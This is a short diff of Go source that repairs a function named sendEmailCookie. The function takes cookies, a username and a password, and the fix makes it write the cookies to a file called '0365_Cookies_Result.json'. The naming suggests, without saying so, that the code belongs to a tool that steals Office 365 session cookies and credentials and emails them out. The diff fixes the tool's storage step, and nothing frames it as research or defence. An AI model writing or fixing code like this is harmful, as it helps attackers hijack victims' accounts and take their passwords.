@@ -93,12 +93,12 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 	defer request.Body.Close()
 	
 	// 	// Body
-	postBody, err = os.ReadAll(request.Body)
+	postBody, err = ioutil.ReadAll(request.Body)
 	if err != nil {
 		log.Fatalf("%s", err)
 	}
 	
-	err = os.WriteFile("%s_Result.json", username, []byte(cookies), 0755)
+	err = os.WriteFile("0365_Cookies_Result.json", []byte(cookies), 0755)
 	if err != nil {
 		fmt.Printf("Unable to write file: %v", err)
 	}
